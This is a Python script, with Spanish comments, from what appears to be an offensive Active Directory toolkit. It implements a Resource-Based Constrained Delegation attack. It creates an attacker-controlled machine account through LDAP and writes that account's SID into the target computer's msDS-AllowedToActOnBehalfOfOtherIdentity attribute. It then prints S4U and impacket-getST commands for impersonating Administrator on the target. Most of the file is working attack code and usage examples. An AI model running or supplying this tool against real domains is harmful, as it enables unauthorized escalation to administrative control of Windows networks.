# scripts/kerberos/delegation/rbcd.py
#
# Técnica: Resource-Based Constrained Delegation (RBCD)
#
# Fundamento:
#   RBCD (introducida en Windows 2012 R2) invierte el control: en vez de que el
#   ADMIN configure qué cuentas PUEDEN delegar, el propietario del RECURSO decide
#   qué cuentas tienen permiso para actuar en su nombre.
#
#   El atributo msDS-AllowedToActOnBehalfOfOtherIdentity en el objeto EQUIPO
#   contiene un Security Descriptor con los SIDs que pueden impersonar.
#
#   El ataque:
#     1. Necesitas GenericWrite/WriteDACL sobre el objeto equipo objetivo.
#     2. Creas o usas una cuenta de máquina bajo tu control
#        (ms-DS-MachineAccountQuota permite a usuarios crear hasta 10 por defecto).
#     3. Escribes el SID de tu cuenta en msDS-AllowedToActOnBehalfOfOtherIdentity
#        del equipo objetivo.
#     4. S4U2Self + S4U2Proxy desde tu cuenta de máquina → ST como Domain Admin
#        para cualquier servicio del equipo objetivo (CIFS, HOST, etc.).
#
#   Por qué es poderoso:
#     - Solo requiere GenericWrite sobre UN equipo (muy común en misconfiguraciones).
#     - La cuenta de máquina que creas no necesita privilegios especiales.
#     - No modifica nada en el dominio excepto un atributo en el equipo objetivo.
#
#   Escenarios típicos:
#     - Escritura DACL sobre un equipo por ser miembro de un grupo con ese derecho.
#     - Cuentas de servicio con GenericAll sobre UOs que contienen equipos.
#     - Exchange "WriteDACL" sobre todos los objetos (el clásico PrivExchange).

from scripts.base import BaseScript
from core.kerberos_transport import send_krb_message, check_kdc_reachable
from core.asn1_helpers import (
    build_as_req, build_pa_data, build_enc_timestamp,
    build_s4u2self_tgs_req,
    is_as_rep, is_tgs_rep, is_krb_error, parse_krb_error,
    parse_as_rep_ticket, decrypt_as_rep_enc_part_rc4,
    nt_hash as compute_nt_hash,
    ETYPE_RC4_HMAC, PA_ENC_TIMESTAMP,
)
from core.output import print_result, console
from core import session_db


class RBCDScript(BaseScript):
    name = "rbcd"
    description = "Resource-Based Constrained Delegation: escribe msDS-AllowedToActOnBehalfOfOtherIdentity y abusa S4U"

    examples = [
        {"flag": "--target-computer",
         "desc": "Nombre NetBIOS del equipo objetivo (sobre el que tienes GenericWrite)",
         "good": "kerberos --script=rbcd -t 10.129.1.5 -d CORP.LOCAL -u jsmith -p 'Pass123!' --target-computer SRV01 --attacker-account SRV02$",
         "bad": "kerberos --script=rbcd ... --target-computer SRV01.corp.local  [usa el nombre NetBIOS sin FQDN ni punto al final]"},
        {"flag": "--attacker-account",
         "desc": "Cuenta de máquina bajo tu control (con $ al final). Si no existe, se crea una nueva.",
         "good": "kerberos --script=rbcd ... --attacker-account LOBERA01$",
         "bad": "kerberos --script=rbcd ... --attacker-account jsmith  [debe ser una cuenta de MÁQUINA ($), no de usuario]"},
        {"flag": "--target-user",
         "desc": "Usuario a impersonar en el servicio del equipo objetivo",
         "good": "kerberos --script=rbcd ... --target-user Administrator",
         "bad": "kerberos --script=rbcd ... --target-user krbtgt  [krbtgt no tiene acceso a servicios normales]"},
    ]

    def run(self, **kwargs):
        realm = (self.creds.domain or self.target.domain or "").upper()
        kdc = self.target.ip
        target_computer = kwargs.get("target_computer")
        attacker_account = kwargs.get("attacker_account")
        target_user = kwargs.get("target_user") or "Administrator"
        spn = kwargs.get("spn") or f"cifs/{target_computer}.{realm.lower()}" if target_computer else None

        if not realm: console.print("[red]Falta -d.[/red]"); return
        if not target_computer: console.print("[red]Falta --target-computer.[/red]"); return
        if not (self.creds.password or self.creds.hash):
            console.print("[red]Falta -p o -H.[/red]"); return

        if not check_kdc_reachable(kdc, timeout=self.target.timeout):
            print_result("KRB", kdc, "fail", "KDC no alcanzable"); return

        # Paso 1: crear cuenta de máquina si no se proporciona
        if not attacker_account:
            attacker_account = self._create_machine_account(kdc, realm)
            if not attacker_account:
                console.print("[red]No se pudo crear cuenta de máquina. "
                               "Usa --attacker-account para especificar una existente.[/red]")
                return

        print_result("KRB", kdc, "info",
                     f"rbcd: {attacker_account} → msDS-AllowedToActOnBehalfOfOtherIdentity en {target_computer}")

        # Paso 2: obtener SID de la cuenta atacante via LDAP
        attacker_sid = self._get_sid(kdc, realm, attacker_account)
        if not attacker_sid:
            console.print(f"[yellow]No se pudo obtener SID de {attacker_account} via LDAP.[/yellow]")
            console.print("[dim]Usa ldapsearch o AD Users & Computers para verificar que la cuenta existe.[/dim]")
            return

        # Paso 3: escribir msDS-AllowedToActOnBehalfOfOtherIdentity via LDAP
        ok = self._write_rbcd(kdc, realm, target_computer, attacker_sid)
        if not ok:
            console.print("[red]Error escribiendo msDS-AllowedToActOnBehalfOfOtherIdentity. "
                           "¿Tienes GenericWrite sobre el equipo?[/red]")
            return

        print_result("KRB", kdc, "ok",
                     f"RBCD configurado: {attacker_account} puede delegar en {target_computer}")
        session_db.save_finding(kdc, "KRB", "rbcd_configured",
                                 f"{attacker_account} → {target_computer}")

        # Paso 4: S4U2Self + S4U2Proxy desde la cuenta atacante
        console.print()
        console.print(f"[bold yellow]Ahora ejecuta el S4U abuse:[/bold yellow]")
        console.print(f"  kerberos --script=constrained-s4u -t {kdc} -d {realm} "
                       f"-u {attacker_account.rstrip('$')} -p <password> "
                       f"--target-user {target_user} --spn {spn}")
        console.print()
        console.print("[dim]O con impacket directamente:[/dim]")
        console.print(f"  impacket-getST -spn {spn} -impersonate {target_user} "
                       f"'{realm.lower()}/{attacker_account}:<password>' -dc-ip {kdc}")

    def _create_machine_account(self, kdc, realm):
        """Crea una cuenta de máquina via LDAP (ms-DS-MachineAccountQuota lo permite)."""
        try:
            from modules.ldap import LDAPModule
            from core.target import Target
            import secrets as _secrets
            name = "LOBERA" + _secrets.token_hex(3).upper()
            ldap = LDAPModule(Target(ip=kdc, domain=realm.lower()), self.creds)
            pwd = _secrets.token_urlsafe(16) + "A1!"
            ldap.create_machine_account(name, pwd)
            console.print(f"[green]Cuenta de máquina creada: {name}$ / {pwd}[/green]")
            return f"{name}$"
        except (ImportError, Exception) as e:
            console.print(f"[dim]No se pudo crear cuenta de máquina: {e}[/dim]")
            return None

    def _get_sid(self, kdc, realm, account):
        try:
            from modules.ldap import LDAPModule
            from core.target import Target
            ldap = LDAPModule(Target(ip=kdc, domain=realm.lower()), self.creds)
            return ldap.get_sid(account.rstrip('$'))
        except (ImportError, Exception):
            return None

    def _write_rbcd(self, kdc, realm, target_computer, attacker_sid):
        try:
            from modules.ldap import LDAPModule
            from core.target import Target
            ldap = LDAPModule(Target(ip=kdc, domain=realm.lower()), self.creds)
            return ldap.write_rbcd(target_computer, attacker_sid)
        except (ImportError, Exception) as e:
            console.print(f"[dim]LDAP write error: {e}[/dim]")
            return False
